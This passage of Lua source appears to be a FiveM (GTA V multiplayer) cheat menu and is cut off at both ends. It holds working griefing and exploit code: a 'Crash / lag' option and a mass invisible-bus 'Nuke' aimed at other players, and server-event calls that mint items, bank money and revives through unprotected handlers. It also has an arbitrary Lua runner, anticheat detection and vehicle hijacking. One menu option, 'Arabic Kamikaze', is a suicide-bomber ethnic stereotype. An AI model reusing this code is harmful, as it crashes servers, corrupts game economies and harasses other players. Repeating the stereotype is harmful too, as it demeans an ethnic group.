                --     if offset > 7.5 then
                --         SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, 3.0 - (offset - 7.5), (-4.5 + customforward) + offset, height))
                --     else
                --         SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, 3.0, (-4.5 + customforward) + offset, height))
                --     end
                -- else
                --     if offset < -3.0 then
                --         if offset < -7.5 then
                --             SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, -3.0 - (offset + 7.5), (-4.5 + customforward) - offset, height))
                --         else
                --             SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, -3.0, (-4.5 + customforward) - offset, height))
                --         end
                --     else
                --         if offset > 0.0 then
                --             SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, offset, (-4.5 + customforward) + offset, height))
                --         else
                --             SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(maincar, offset, (-4.5 + customforward) - offset, height))
                --         end
                --     end
                -- end

                offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)
        
                if (offsetRotX > 90.0) then 
                    offsetRotX = 90.0 
                elseif (offsetRotX < -90.0) then 
                    offsetRotX = -90.0 
                end
        
                if (offsetRotY > 90.0) then 
                    offsetRotY = 90.0 
                elseif (offsetRotY < -90.0) then 
                    offsetRotY = -90.0 
                end
        
                if (offsetRotZ > 360.0) then 
                    offsetRotZ = offsetRotZ - 360.0 
                elseif (offsetRotZ < -360.0) then 
                    offsetRotZ = offsetRotZ + 360.0 
                end
                local rot = GetEntityRotation(pped)
                SetCamRot(cam, rot.x + offsetRotX, rot.y + offsetRotY, rot.z + offsetRotZ, 2)
                
                local offset = offsetRotZ / 18.0
                if offset > 10.5 then 
                    offset = offset - 21
                elseif offset < -10.5 then
                    offset = offset + 21
                end

                print(offset)

                local height = (offsetRotX / 10.0) * -1
                local coords = GetEntityCoords(pped)
                local success, groundz = GetGroundZFor_3dCoord(coords.x, coords.y, coords.z, true)
                local customforward = 0.0

                if success then
                    if GetOffsetFromEntityInWorldCoords(pped, 0.0, 0.0, height).z - groundz < 0.0 then
                        customforward = height * -1
                        if customforward > 1.75 then customforward = 1.75 end
                        height = (groundz - GetEntityCoords(pped).z)
                    end
                end
                
                height = height + 0.25

                if height > 4.0 then 
                    customforward = height - 4.0
                    if customforward > 5.0 then customforward = 5.0 end
                    height = 4.0 
                end

                if offset > 3.0 then
                    if offset > 7.5 then
                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, 3.0 - (offset - 7.5), (-4.5 + customforward) + offset, height))
                    else
                        SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, 3.0, (-4.5 + customforward) + offset, height))
                    end
                else
                    if offset < -3.0 then
                        if offset < -7.5 then
                            SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, -3.0 - (offset + 7.5), (-4.5 + customforward) - offset, height))
                        else
                            SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, -3.0, (-4.5 + customforward) - offset, height))
                        end
                    else
                        if offset > 0.0 then
                            SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, offset, (-4.5 + customforward) + offset, height))
                        else
                            SetCamCoord(cam, GetOffsetFromEntityInWorldCoords(pped, offset, (-4.5 + customforward) - offset, height))
                        end
                    end
                end
            end
            ClearFocus()
        end)
    elseif data['Text'] == '☢️ Nuke' then
        CreateThread(function()
            for i = 1, 1000 do
                CreateThread(function()
                    local model = GetHashKey('bus')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local car = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -8.0, 0.0), GetEntityHeading(pped), true, true)
                    SetVehicleForwardSpeed(car, 750/3.6)
                    SetEntityVisible(car, false)
                    Wait(250)
                    DeleteEntity(car)
                end)
                Wait(15)
            end
        end)
    elseif data['Text'] == 'Stop spectating' then
        spectating = false
        currentlyspectating = 0
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'spectat') then
                v['Text'] = 'Spectate'
            end
        end

        DestroyCam(cam)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)
    elseif data['Text'] == 'Crash / lag' then
        if not anticheatrunning then
            local ObjectHashes = {
                0x34315488,
                0x6A27FEB1, 0xCB2ACC8,
                0xC6899CDE, 0xD14B5BA3,
                0xD9F4474C, 0x32A9996C,
                0x69D4F974, 0xCAFC1EC3,
                0x79B41171, 0x1075651,
                0xC07792D4, 0x781E451D,
                0x762657C6, 0xC2E75A21,
                0xC3C00861, 0x81FB3FF0,
                0x45EF7804, 0xE65EC0E4,
                0xE764D794, 0xFBF7D21F,
                0xE1AEB708, 0xA5E3D471,
                0xD971BBAE, 0xCF7A9A9D,
                0xC2CC99D8, 0x8FB233A4,
                0x24E08E1F, 0x337B2B54,
                0xB9402F87, 0x4F2526DA,
            }

            if #(GetEntityCoords(pped) - GetEntityCoords(PlayerPedId())) < 1000 then
                SetEntityCoords(PlayerPedId(), GetEntityCoords(pped) + vec3(1250, 1250, 1000))
            end

            for k, v in pairs(ObjectHashes) do
                while not HasModelLoaded(v) do
                    RequestModel(v)
                    Wait(0)
                end
                CreateObject(v, GetEntityCoords(pped), true, true, true)
            end
        else
            AnticheatWarning()
        end
    elseif data['Text'] == 'Cage Player' then
        if not anticheatrunning then
            local model = GetHashKey('prop_rub_cage01b')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            local obj = CreateObject(model, GetEntityCoords(pped) + vec3(-1.7, -1.7, -1.0), true, true, true)
            table.insert(spawnedprops, obj)
            SetEntityHeading(obj, -90.0)
            FreezeEntityPosition(obj, true)
            obj = CreateObject(model, GetEntityCoords(pped) + vec3(1.7, 1.7, -1.0), true, true, true)
            table.insert(spawnedprops, obj)
            SetEntityHeading(obj, 90.0)
            FreezeEntityPosition(obj, true)
        else
            AnticheatWarning()
        end
    elseif data['Text'] == '👳 Arabic Kamikaze' then
        local model = GetHashKey('mp_m_freemode_01')
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end

        local ped = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -1.0, -1.0), GetEntityHeading(pped), true, true)
        
        SetPedDefaultComponentVariation(ped)
        SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
        SetPedComponentVariation(ped, 1, 115, 0, 2)
        SetPedComponentVariation(ped, 3, 4, 0, 2)
        SetPedComponentVariation(ped, 11, 12, 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 4, 56, 0, 2)
        SetPedComponentVariation(ped, 6, 34, 0, 2)
        
        CreateThread(function()
            PlayPain(ped, 6, 0, 0)
            Wait(500)
            AddExplosion(GetEntityCoords(ped), 34, 500.0, true, false, false, false)
        end)
    elseif data['Text'] == 'Drive-by [ped]' then
        CreateThread(function() 
            local found, coords = GetClosestVehicleNode(table.unpack(GetEntityCoords(pped)), 1)
            while not found do
                found, coords = GetClosestVehicleNode(table.unpack(GetEntityCoords(pped)), 1)
                Wait(250)
            end

            local model = GetHashKey('baller')
            
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            print(coords)
            local veh = CreateVehicle(model, coords, 0.0, true, true)

            local model = GetHashKey('u_m_y_abner')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            
            local driver = CreatePedInsideVehicle(veh, 4, model, -1, true, true)
            GiveWeaponToPed(driver, GetHashKey('WEAPON_PISTOL50'), 250, false, true)
            SetPedInfiniteAmmo(driver, true, GetHashKey('WEAPON_PISTOL50'))
            SetPedInfiniteAmmoClip(driver, true)
            local closethread = GetGameTimer() + 999999
            local closing = false
            TaskVehicleFollow(driver, veh, pped, 40.0, 262144, 10)

            while true do
                Wait(750)

                print(#(GetEntityCoords(pped).xy - GetEntityCoords(driver).xy))

                if #(GetEntityCoords(pped).xy - GetEntityCoords(driver).xy) <= 50.0 and HasEntityClearLosToEntity(driver, pped, 17) then
                    if not closing then
                        closing = true
                        closethread = GetGameTimer() + 25000
                    end
                end

                if closing then
                    TaskCombatPed(driver, pped, 0, 16)
                    SetPedCombatAttributes(driver, 3, false)
                    SetPedCombatAttributes(driver, 0, false)
                    if IsPedDeadOrDying(pped) then
                        closethread = 0
                    end
                end

                if closethread <= GetGameTimer() then
                    ClearPedTasks(driver)
                    TaskVehicleDriveWander(driver, veh, 40.0, 262144)

                    SetTimeout(15000, function()
                        DeleteEntity(driver)
                        DeleteEntity(veh)
                    end)
                    return
                end
            end
        end)
    elseif data['Text'] == 'Set as friend' then
        friends[currentplayer] = true
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'friend') then
                v['Text'] = 'Remove friend'
            end
        end
    elseif data['Text'] == 'Remove friend' then
        friends[currentplayer] = false
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'friend') then
                v['Text'] = 'Set as friend'
            end
        end
    end
end

local SpawnVehicle = function(data)
    CreateThread(function()
        local model = GetHashKey(data['Items'][data['Current']])
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end
        local car = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), -4.0, 2.0, 0.0), GetEntityHeading(PlayerPedId()), true, true)
        SetVehicleNeedsToBeHotwired(car, false)
        SetVehRadioStation(car, 'OFF')
        SetVehicleDirtLevel(car, 0.0)

        if Toggles['Enter car when spawning'] then
            SetEntityCoords(car, GetEntityCoords(PlayerPedId()))
            TaskWarpPedIntoVehicle(PlayerPedId(), car, -1)
        end
    end)
end

local CarMenu = function(data)
    local txt = data['Text']:lower()
    local vehicle = GetVehiclePedIsUsing(PlayerPedId())
    if string.find(data['Text']:lower(), ('custom input'):lower()) then
        local veh = KeyboardInput('What car do you want to spawn?', '', 30)
        if veh then
            SpawnVehicle({['Items'] = {veh}, ['Current'] = 1})
        end
    elseif string.find(txt, ('neon lights')) then
        if data['Type'] == 'toggle' then
            if DoesEntityExist(vehicle) then
                for i = 0, 3 do
                    SetVehicleNeonLightEnabled(vehicle, i, data['Enabled'])
                end
            end
        end
    elseif txt == 'neon rgb' or txt == 'paintjob rgb' or txt == 'vehicle nitro [l ctrl]' then
        Toggles[data['Text']] = data['Enabled']
    elseif txt == 'set vehicle plate text' then
        local veh = GetVehiclePedIsUsing(PlayerPedId())
        if veh then
            if DoesEntityExist(veh) then
                local plate = KeyboardInput('What plate do you want?', '', 8)
                if plate then
                    SetVehicleNumberPlateText(veh, plate)
                end
            else
                Alert('You are not sitting in a vehicle.')
            end
        else
            Alert('You are not sitting in a vehicle.')
        end
    elseif txt == 'boost vehicle' then
        Toggles['Boost vehicle'] = data['Items'][data['Current']]
    elseif txt == 'speed (km/h)' then
        autodrivespeed = data['Items'][data['Current']]
    elseif txt == 'repair car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleFixed(vehicle)
        end
    elseif txt == 'stealth repair' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleOilLevel(vehicle, 1000.0)
        end
    elseif txt == 'wash car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleDirtLevel(vehicle, 0.0)
        end
    elseif txt == 'unlock closest car' then
        local vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
        if vehicle then
            if DoesEntityExist(vehicle) then
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForPlayer(vehicle, PlayerId(), false)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
            end
        end
    elseif txt == 'delete car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        local delete = function(vehicle)
            CreateThread(function()
                while DoesEntityExist(vehicle) do
                    while not NetworkHasControlOfEntity(vehicle) do
                        NetworkRequestControlOfEntity(vehicle)
                        Wait(0)
                    end
                    SetEntityAsMissionEntity(vehicle, true, true)
                    DeleteEntity(vehicle)
                    Wait(100)
                end
            end)
        end
        if DoesEntityExist(vehicle) then
            delete(vehicle)
        else
            vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
            if vehicle then
                delete(vehicle)
            end
        end
    elseif txt == 'speedometer' then
        Toggles[data['Text']] = data['Items'][data['Current']]
    end
end

local AutoDrive00sacfsadfc = function()
    while true do
        Wait(0)
        if Toggles['Drive to waypoint'] then
            local vehicle = GetVehiclePedIsUsing(PlayerPedId())
            if DoesEntityExist(vehicle) then
                local coords = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
                TaskVehicleDriveToCoord(PlayerPedId(), vehicle, coords, GetVehicleMaxSpeed(vehicle), 0, -1848994066, 263100, 10.0)
                SetDriveTaskDrivingStyle(PlayerPedId(), 263100)       
                SetPedKeepTask(PlayerPedId(), true)
                while Toggles['Drive to waypoint'] do
                    Wait(0)
                    SetEntityMaxSpeed(vehicle, (autodrivespeed + 1) / 3.6)
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        if GetDistanceBetweenCoords(coords, GetEntityCoords(PlayerPedId()), false) <= 25.0 then
                            Toggles['Drive to waypoint'] = false
                            ClearPedTasks(PlayerPedId())
                            ClearPedSecondaryTask(PlayerPedId())
                        end
                    else
                        Toggles['Drive to waypoint'] = false
                    end
                end
                ClearPedTasks(PlayerPedId())
                ClearPedSecondaryTask(PlayerPedId())

                SetEntityMaxSpeed(vehicle, GetVehicleMaxSpeed(vehicle))
            end
        end
    end
end

LoadBlips = function()
    for k, v in pairs(GetActivePlayers()) do
        if not DoesBlipExist(playerblips[v]) then
            local pped = GetPlayerPed(v)
            if pped ~= PlayerPedId() or Toggles['Include self'] then
                playerblips[v] = AddBlipForCoord(GetEntityCoords(pped))
                SetBlipCategory(playerblips[v], 7)
                SetBlipAsShortRange(playerblips[v], true)
                SetBlipScale(playerblips[v], 0.7)
    
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(GetPlayerName(v) .. ' | ' .. GetPlayerServerId(v))
                EndTextCommandSetBlipName(playerblips[v])
            end
        end
    end
end

local PlayerBlips = function(data)
    Toggles['PlayerBlips'] = data['Enabled']

    for k, v in pairs(playerblips) do
        if DoesBlipExist(v) then
            RemoveBlip(v)
        end
    end

    LoadBlips()
end

local WeatherMenu = function(data)
    if data['Text'] == 'Lock time' then
        Toggles['Lock time'] = data['Enabled']
        hourlocked = GetClockHours()
    elseif data['Text'] == 'Set hour of day' then
        hourlocked = tonumber(data['Items'][data['Current']])
        NetworkOverrideClockTime(hourlocked, 0, 0)
    elseif data['Text'] == 'Set weather' then
        weatherlocked = data['Items'][data['Current']]
        if weatherlocked ~= 'NONE' then
            Toggles['Lock weather'] = true
        else
            Toggles['Lock weather'] = false
        end
    end
end

local Crash = function()
    while true do
    end
end

local customizations = {
    ['Special finish'] = {0x27872C90, 0xD7391086, 0x9B76C72C, 0x487AAE09, 0x85A64DF9, 0x377CD377, 0xD89B9658, 0x4EAD7533, 0x4032B5E7, 0x77B8AB2F, 0x7A6A7B7B, 0x161E9241},
    ['Suppressor'] = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E},
    ['Scope'] = {0x9D2FBF29, 0xA0D89C42, 0xAA2C45B4, 0xD2443DDC, 0x3CC6BA57, 0x3C00AFED},
    ['Flashlight'] = {0x359B7AAE, 0x4A4965F3, 0x43FD595B, 0x7BC4CDDC},
    ['Grip'] = {0xC164F53, 0x9D65907A}
}

local WeaponCustomization = function(data)
    local txt, type = data['Text'], data['Items'][data['Current']]
    if customizations[txt] then
        for k, v in pairs(customizations[txt]) do
            if type == 'add' then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), v)
            else
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), v)
            end
        end
    else
        if txt == 'Tint' then
            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), data['Current'] - 1)
        end
    end
end

local AnimationsMenu = function(data)
    if data['Type'] == 'list' then
        local anim = animations[data['Items'][data['Current']]]
        if anim then
            if anim['Type'] == 'animation' then
                CreateThread(function()
                    while not HasAnimDictLoaded(anim['Dict']) do 
                        Wait(0)
                        RequestAnimDict(anim['Dict'])
                    end
                    TaskPlayAnim(PlayerPedId(), anim['Dict'], anim['Anim'], 8.0, -8.0, -1, anim['Flag'], 0, false, false, false)
                end)
            elseif anim['Type'] == 'scenario' then
                TaskStartScenarioInPlace(PlayerPedId(), anim['Anim'], 0, false)
            elseif anim['Type'] == 'walking_style' then
                CreateThread(function()
                    while not HasAnimDictLoaded(anim['Anim']) do 
                        Wait(0)
                        RequestAnimDict(anim['Anim'])
                    end
                    SetPedMovementClipset(PlayerPedId(), anim['Anim'], true)
                end)
            end
        end
    else
        if data['Text'] == 'Cancel animation' then
            ClearPedTasksImmediately(PlayerPedId())
        end
    end
end

local CustomCode = function()
    menuvisiblewdqdq = false
    local code = KeyboardInput('~g~Type your code', '', 999)
    if code then
        CreateThread(function()
            load(code)()
        end)
    end
    menuvisiblewdqdq = true
end
menuvisible = false

---------------------------------Zombie sw giveitem----------------------

local Itemver = function()
    menuvisible = false
    local Itemver = KeyboardInput('~g~Item Name', '', 999)
    
    if Itemver then
    
        CreateThread(function()
    
            TriggerServerEvent("kaves_base:removeItem",Itemver, tonumber('-1'))
    
        end)
    
    end
    
    menuvisible = true
    
    end


----------------------------------BANKAYA PARA YATIRMAK İÇİN  ------------------
local BankDeposit = function()
menuvisible = false
local DepositMoney = KeyboardInput('~g~Enter Money', '', 999)

if DepositMoney then

    CreateThread(function()

        TriggerServerEvent("bank:deposit", DepositMoney)

    end)

end

menuvisible = true

end
----------------------------------BANKADAN PARA ÇEKMEK İÇİN----------------
local BankWihtdraw = function()
    menuvisible = false
    local BankMoney = KeyboardInput('~g~Enter Money', '', 999)
    
    if BankMoney then
    
        CreateThread(function()
    
            TriggerServerEvent("bank:withdraw", BankMoney)
    
        end)
    
    end
    
    menuvisible = true
    
    end

    ---------------------------------BAŞKASINI REVLEME----------------------
local Revive = function()
    menuvisible = false
    local Revive = KeyboardInput('~g~Write ID', '')
    
    if Revive then
    
        CreateThread(function()
    
            TriggerServerEvent('esx_ambulancejob:revive', Revive)
    
        end)
    
    end
    
    menuvisible = true
    
    end

    ---------------------------------Disc Give İtem----------------------

local Discgiveitem = function()
    menuvisible = false
    local Discgiveitem = KeyboardInput('~g~Write Here', '', 999)
    
    if Discgiveitem then
    
        CreateThread(function()
    
            TriggerServerEvent('esx_vehicleshop:putStockItems', Discgiveitem, -1)
    
        end)
    
    end
    
    menuvisible = true
    
    end

---------------------------------M3 Give item----------------------

local m3giveweapon = function()
    menuvisible = false
    local m3giveweapon = KeyboardInput('~g~Write Here', '', 999)
    local m3many = KeyboardInput('~g~How Many?', '', 999)
    if m3giveweapon then
    
        CreateThread(function()
    
            TriggerServerEvent('m3:houserobbery:giveItem', m3giveweapon, m3many)
    
        end)
    
    end
    
    menuvisible = true
    
    end


---------------------------------QB Give item----------------------

local qbgiveitem = function()
    menuvisible = false
    local qbgiveitem = KeyboardInput('~g~Write Here', '', 999)
    local qbadet = KeyboardInput('~g~How Many?', '', 999)
    if qbgiveitem then
    
        CreateThread(function()
    
            TriggerServerEvent('QBCore:Server:AddItem', qbgiveitem, qbadet)
    
        end)
    
    end
    
    menuvisible = true
    
    end

---------------------------------ANNOUNCE ATMAK İÇİN----------------------

    local Announce = function()
        menuvisible = false
        local Announce = KeyboardInput('~g~Write Here', '', 999)
        
        if Announce then
        
            CreateThread(function()
        
                TriggerServerEvent("chat:server:ServerPSA", Announce)
        
            end)
        
        end
        
        menuvisible = true
        
        end

--------------------------------------CRP ITEM----------------------

    local Crpitem = function()
        menuvisible = false
        local Crpitem = KeyboardInput('~g~Write Here', '', 999)
        
        if Crpitem then
        
            CreateThread(function()
        
                TriggerServerEvent("CRPEngine:Server:AddItem", Crpitem, 1)
        
            end)
        
        end
        
        menuvisible = true
        
        end

local PlayInteractSound = function(data)
    if data['Text'] == 'Play on all' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', data['Items'][data['Current']], 1.0)
    elseif data['Text'] == 'Play sound on player' then
        TriggerServerEvent('InteractSound_SV:PlayOnOne', currentplayer, data['Items'][data['Current']], 1.0)
    elseif data['Text'] == 'Cancel sound (self)' then
        TriggerEvent('InteractSound_CL:PlayOnOne', interactsoundaudios[1], 0.0)
    elseif data['Text'] == 'Cancel sound (all)' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', interactsoundaudios[1], 0.0)
    end
end

RegisterNetEvent('InteractSound_CL:PlayOnAll')
AddEventHandler('InteractSound_CL:PlayOnAll', function()
    print('Interactsound: someone started playing a sound')
    if Toggles['Interactsound blocker'] then
        Wait(50)
        print('Interactsound: blocked sound')
        TriggerEvent('InteractSound_CL:PlayOnOne', interactsoundaudios[1], 0.0)
    end
end)

local freecamcam = nil

local TakeControl = function(veh)
    local timer = GetGameTimer() + 10000
    while not NetworkHasControlOfEntity(veh) do
        NetworkRequestControlOfEntity(veh)
        Wait(0)
        if timer <= GetGameTimer() then
            DestroyCam(freecamcam)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            ClearFocus()
            FreezeEntityPosition(PlayerPedId(), false)
            return
        end
    end

    if DoesEntityExist(veh) then
        local Driver = CreatePedInsideVehicle(veh, 4, LoadModel('u_m_y_abner'), -1, true, true)
        SetEntityInvincible(Driver, true)
        SetEntityVisible(Driver, false)
        FreezeEntityPosition(Driver, true)
        SetPedAlertness(Driver, 0.0)

        Wait(500)

        CreateThread(function()
            SetCamCoord(freecamcam, GetEntityCoords(veh))

            SetFocusEntity(veh)

            while DoesEntityExist(veh) do
                Wait(0)

                if DoesEntityExist(veh) then
                    ControlCar(Driver, veh)
                else
                    DeleteEntity(Driver)
                end
            end

            DeleteEntity(Driver)
        end)

        CreateThread(function()
            local offsetRot = {x = 0, y = 0, z = 0}
            local cameraZ, customLeftRight = 2.0, 0.0
            local NitroTimer = 0

            Wait(500)

            TaskWarpPedIntoVehicle(Driver, veh, -1)

            while DoesEntityExist(Driver) do
                Wait(0)

                AddTextEntry(GetCurrentResourceName(), '~INPUT_CONTEXT~ Stop controlling this car\n~INPUT_DETONATE~ Flip vehicle\n~INPUT_COVER~ Repair car\n~INPUT_CELLPHONE_UP~ ~INPUT_CELLPHONE_DOWN~ Adjust camera height\n~INPUT_CELLPHONE_LEFT~ ~INPUT_CELLPHONE_RIGHT~ Adjust camera position')
                DisplayHelpTextThisFrame(GetCurrentResourceName(), false)

                if IsControlJustReleased(0, 47) then
                    SetEntityCoords(veh, GetEntityCoords(veh) + vec3(0.0, 0.0, 2.0))
                    Wait(50)
                    SetVehicleOnGroundProperly(veh)
                end

                if IsControlJustReleased(0, 44) then
                    SetVehicleFixed(veh)
                end

                offsetRot.x = offsetRot.x - (GetDisabledControlNormal(1, 2) * 8.0)
                offsetRot.z = offsetRot.z - (GetDisabledControlNormal(1, 1) * 8.0)
        
                if (offsetRot.x > 90.0) then 
                    offsetRot.x = 90.0 
                elseif (offsetRot.x < -90.0) then 
                    offsetRot.x = -90.0 
                end
        
                if (offsetRot.y > 90.0) then 
                    offsetRot.y = 90.0 
                elseif (offsetRot.y < -90.0) then 
                    offsetRot.y = -90.0 
                end
        
                if (offsetRot.z > 360.0) then 
                    offsetRot.z = offsetRot.z - 360.0 
                elseif (offsetRot.z < -360.0) then 
                    offsetRot.z = offsetRot.z + 360.0 
                end

                if not menuvisiblewdqdq then
                    if IsControlPressed(0, 172) then
                        if cameraZ + 0.1 <= 7.5 then
                            cameraZ = cameraZ + 0.1
                        else
                            cameraZ = -2.0
                        end
                    end

                    if IsControlPressed(0, 173) then
                        if cameraZ - 0.1 >= -2.0 then
                            cameraZ = cameraZ - 0.1
                        else
                            cameraZ = 7.5
                        end
                    end

                    if IsControlPressed(0, 174) then
                        if customLeftRight - 0.1 >= -5.0 then
                            customLeftRight = customLeftRight - 0.1
                        else
                            customLeftRight = 5.0
                        end
                    end

                    if IsControlPressed(0, 175) then
                        if customLeftRight + 0.1 <= 5.0 then
                            customLeftRight = customLeftRight + 0.1
                        else
                            customLeftRight = -5.0
                        end
                    end
                end

                if Toggles['Vehicle nitro [L CTRL]'] and NitroTimer <= GetGameTimer() then
                    if IsDisabledControlPressed(0, 36) then
                        SetVehicleBoostActive(veh, true)
                        StartScreenEffect('RaceTurbo', 0, 0)
                        SetVehicleForwardSpeed(veh, GetEntitySpeed(veh) + 15)
                        NitroTimer = GetGameTimer() + 1000
                    end
                end

                if Toggles['Insta brake [SPACE + S]'] then
                    if IsControlPressed(0, 72) and IsControlPressed(0, 76) then
                        SetVehicleForwardSpeed(veh, 0.0)
                    end
                end

                if Toggles['Boost vehicle'] then
                    SetVehicleEnginePowerMultiplier(veh, tonumber(Toggles['Boost vehicle']) / 1)
                end

                if Toggles['Super handling'] then
                    SetVehicleGravityAmount(veh, 20.0)
                else
                    SetVehicleGravityAmount(veh, 10.0)
                end

                local rot = GetEntityRotation(veh, 2)
                SetCamCoord(freecamcam, GetOffsetFromEntityInWorldCoords(veh, 0.0 + customLeftRight, -5.5, cameraZ))
                SetCamRot(freecamcam, rot.x + offsetRot.x, rot.y + offsetRot.y, rot.z + offsetRot.z, 2)

                if IsControlJustReleased(0, 51) then
                    break
                end
            end
            
            DestroyCam(freecamcam)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            DeleteEntity(Driver)
            ClearFocus()
            FreezeEntityPosition(PlayerPedId(), false)
        end)
    end
end

local FreeCam = function(data)
    if data['Text'] == 'Freecam speed' then
        Toggles['Freecam speed'] = tonumber(data['Items'][data['Current']])
    end
    if data['Text'] == 'Freecam object' then
        Toggles['Freecam object'] = data['Current']
    end
    if data['Text'] == 'Freecam' then
        if data['Enabled'] then
            FreezeEntityPosition(PlayerPedId(), true)
            local fakeobj = 0
            
            CreateThread(function()
                local cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                freecamcam = cam
                RenderScriptCams(1, 0, 0, 1, 1)
                SetCamActive(cam, true)
                SetCamCoord(cam, GetEntityCoords(PlayerPedId()))
            
                local offsetRotX = 0.0
                local offsetRotY = 0.0
                local offsetRotZ = 0.0
                                    
                local weapondelay = 0

                while DoesCamExist(freecamcam) do
                    Wait(0)
            
                    local playerPed = PlayerPedId()
                    local playerRot = GetEntityRotation(playerPed, 2)
                    local vehicletimer, closest, closestobj = 0

            
                    local rotX = playerRot.x
                    local rotY = playerRot.y
                    local rotZ = playerRot.z
            
                    offsetRotX = offsetRotX - (GetDisabledControlNormal(1, 2) * 8.0)
                    offsetRotZ = offsetRotZ - (GetDisabledControlNormal(1, 1) * 8.0)
            
                    if (offsetRotX > 90.0) then 
                        offsetRotX = 90.0 
                    elseif (offsetRotX < -90.0) then 
                        offsetRotX = -90.0 
                    end
            
                    if (offsetRotY > 90.0) then 
                        offsetRotY = 90.0 
                    elseif (offsetRotY < -90.0) then 
                        offsetRotY = -90.0 
                    end
            
                    if (offsetRotZ > 360.0) then 
                        offsetRotZ = offsetRotZ - 360.0 
                    elseif (offsetRotZ < -360.0) then 
                        offsetRotZ = offsetRotZ + 360.0 
                    end

                    -- SetCamCoord(cam, GetCamCoord(cam) + vec3(0.0, 2.0, 0.0))
                    local x, y, z = table.unpack(GetCamCoord(cam))
                    if IsDisabledControlPressed(1, 32) then -- W
                        SetCamCoord(cam, GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * (0.5 * Toggles['Freecam speed'])))
                    elseif IsDisabledControlPressed(1, 33) then
                        SetCamCoord(cam, GetCamCoord(cam) - (RotationToDirection(GetCamRot(cam, 2)) * (0.5 * Toggles['Freecam speed'])))
                    end

                    if (IsDisabledControlPressed(1, 21)) then -- SHIFT
                        z = z + (0.1 * Toggles['Freecam speed'])
                    end
                    if (IsDisabledControlPressed(1, 36)) then -- LEFT CTRL
                        z = z - (0.1 * Toggles['Freecam speed'])
                    end

                    SetFocusArea(GetCamCoord(cam).x, GetCamCoord(cam).y, GetCamCoord(cam).z, 0.0, 0.0, 0.0)
                    SetCamRot(cam, offsetRotX, offsetRotY, offsetRotZ, 2)

                    local Markerloc = GetCamCoord(cam) + (RotationToDirection(GetCamRot(cam, 2)) * 15)
                    local rgb = RGB(0.5)
            
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.35, 0.35, 0.35, rgb[1], rgb[2], rgb[3], 175, false, true, 2, nil, nil, false)
                    -- \n~INPUT_COVER~ Take control of vehicle
                    AddTextEntry(GetCurrentResourceName(), '~INPUT_MAP_POI~ ~g~Tase\n~INPUT_CONTEXT~ ~g~Shoot rocket\n~INPUT_ATTACK~ ~g~Place object\n~INPUT_AIM~ ~g~Delete object\n~INPUT_COVER~ ~g~Take control of vehicle\n~INPUT_MOVE_UP_ONLY~ ~g~Forward\n~INPUT_MOVE_DOWN_ONLY~ ~g~Backwards')
                    DisplayHelpTextThisFrame(GetCurrentResourceName(), false)

                    if IsDisabledControlJustReleased(0, 24) then
                        CreateThread(function()
